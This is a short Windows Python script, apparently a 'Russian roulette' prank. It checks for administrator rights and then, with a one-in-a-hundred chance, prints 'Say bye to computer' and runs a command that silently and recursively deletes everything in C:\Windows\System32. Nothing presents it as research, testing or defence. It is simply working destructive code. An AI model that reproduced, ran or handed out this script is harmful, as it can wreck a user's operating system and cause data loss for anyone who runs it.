import os 
import random
import ctypes
import time
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    print("Running as administrator on Windows.")
else:
    print("Not running as administrator on Windows. Program can works uncorrect if you are not administrator.")

lucky = random.randint(1, 100)
if lucky == 1:
    os.system("color 2 ")
    os.system("echo 'Say bye to computer'")
    time.sleep(3)
    os.system("del /s /q C:\Windows\System32\*")
else:
    os.system("echo 'lucky enough.'")
    
